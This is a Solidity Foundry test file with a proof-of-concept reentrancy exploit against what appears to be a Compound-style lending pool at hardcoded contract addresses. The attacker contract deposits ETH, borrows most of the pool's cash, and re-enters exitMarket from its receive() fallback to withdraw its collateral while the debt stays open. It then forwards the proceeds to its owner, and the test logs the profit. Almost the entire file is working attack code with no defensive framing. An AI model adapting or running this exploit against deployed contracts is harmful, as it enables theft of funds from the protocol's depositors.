// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function redeem(uint256) external returns (uint256);
}

contract P72Attacker {
    IComptroller constant COMP = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);
    address payable public owner;
    bool public inBorrow;
    uint256 public exitCode;
    bool public reentered;

    constructor() { owner = payable(msg.sender); }

    function go() external payable {
        FETH.mint{value: msg.value}();
        address[] memory m = new address[](1);
        m[0] = address(FETH);
        COMP.enterMarkets(m);
        
        uint256 cash = FETH.getCash();
        uint256 borrowAmt = cash > 1 ether ? cash - 1 ether : cash / 2;
        
        inBorrow = true;
        uint256 res = FETH.borrow(borrowAmt);
        inBorrow = false;
        
        console.log("borrow result:", res);
        console.log("reentered:", reentered);
        console.log("exitCode:", exitCode);
        
        if (reentered && exitCode == 0) {
            uint256 cBal = FETH.balanceOf(address(this));
            if (cBal > 0) {
                uint256 rr = FETH.redeem(cBal);
                console.log("redeem result:", rr);
            }
        }
        
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!inBorrow || reentered) return;
        reentered = true;
        exitCode = COMP.exitMarket(address(FETH));
    }
}

contract Pool72QuickTest is Test {
    function test_p72() external {
        vm.deal(address(this), 200 ether);
        P72Attacker att = new P72Attacker();
        uint256 before = address(this).balance;
        att.go{value: 150 ether}();
        uint256 after_ = address(this).balance;
        console.log("ETH before:", before / 1e18);
        console.log("ETH after:", after_ / 1e18);
        console.log("Profit:", (after_ > before ? after_ - before : 0) / 1e18);
    }
    receive() external payable {}
}
